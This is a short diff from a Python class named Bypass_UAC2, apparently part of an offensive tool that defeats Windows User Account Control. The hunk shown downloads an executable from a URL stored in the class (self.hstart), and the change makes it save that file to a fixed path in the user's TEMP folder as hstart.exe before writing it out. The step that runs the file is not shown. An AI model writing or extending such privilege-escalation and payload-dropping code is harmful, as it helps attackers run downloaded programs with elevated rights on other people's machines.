@@ -11,9 +11,7 @@ class Bypass_UAC2():
 	def Main(self):
 		import win32com.shell.shell as shell
 		req = requests.get(self.hstart)
-		file = tempfile.TemporaryFile()
-		filename = file.name + ".exe"
-		file.close()
+		filename = os.environ['TEMP'] + r"\hstart.exe"
 
 		file = open(filename, "wb")
 		file.write(req.content)
